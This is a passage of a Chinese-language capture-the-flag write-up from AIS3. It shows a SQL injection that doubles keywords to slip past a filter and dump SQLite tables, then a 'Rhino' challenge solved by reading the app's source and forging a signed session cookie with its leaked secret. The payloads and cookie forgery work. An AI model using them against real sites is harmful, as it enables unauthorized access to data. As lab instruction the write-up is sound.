'///******///unununionionion///******///selselselectectect///******///null,sql,null///******///frfrfromomom///******///sqlite_master///******///whewhewhererere///******///type='table'///******///limit///******///1///******///offset///******///0///***
```

先挖 table，找到 `CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )`，只有這個 `garbage` 和 `users`

```
'///******///unununionionion///******///selselselectectect///******///null,name,null///******///frfrfromomom///******///garbage///******///limit///******///1///******///offset///******///0///***
```

再挖 db 裡面，挖到有個 name 是 `something good`，挖他的 value 就看到 flag 了

```
AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c}
```

### Rhino

這題網站在 https://rhino.ais3.org/，`robots.txt` 可以看到東西

```
# RIP robots!

User-agent: *
Disallow: /
Disallow: /index.html
Disallow: /*.xml
Disallow: /recent
Disallow: /assets
Disallow: /about
Disallow: /*.js
Disallow: /*.json
Disallow: /node_modules
Disallow: /flag.txt
```

然後這個網站看起來是用 express 架的然後放 jekyll 產的 blog，既然是 js project 先看個 `package.json`

```
{
  "name": "app",
  "version": "1.0.0",
  "description": "",
  "scripts": {
    "start": "node chill.js",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "djosix",
  "license": "ISC",
  "dependencies": {
    "cookie-session": "^1.4.0",
    "express": "^4.17.1"
  }
}
```

然後就看到原始碼叫做 `chill.js`

```javascript
const express = require('express');
const session = require('cookie-session');

let app = express();

app.use(session({
  secret: "I'm watching you."
}));

app.use('/', express.static('./'));

app.get('/flag.txt', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');

  let n = req.session.magic;

  if (n && (n + 420) === 420)
    res.sendFile('/flag');
  else
    res.send('you are a sad person too');
});

app.get('*', function(req, res){
  res.status(404).sendFile('404.html', { root: __dirname });
});

app.listen(process.env.PORT, '0.0.0.0');
```

看起來只要讓他的 `n && (n + 420) === 420` 就可以讀 flag 了，以前就很常看到 FB 上有人 po 一些 js 的梗圖說明 js 很古怪的行為，隨便看了幾張複習一下，就想到有浮點數誤差的問題，所以 `n` 設成 `0.00000000000001` 就可以了，`n` 是從 `req.session.magic` 抓的，所以我們要設 `req.session.magic` 的話，最簡單的方式就是自己把 server 架起來，然後多加一行 `req.session.magic = 0.00000000000001`，就可以產出 `express:sess` 和 `express:sess.sig` 兩個 Cookie 了，sig 是用前面設定的 `secret: "I'm watching you."` 算出來的，詳情可以看 [cookie-session](https://www.npmjs.com/package/cookie-session)。

```
AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}```
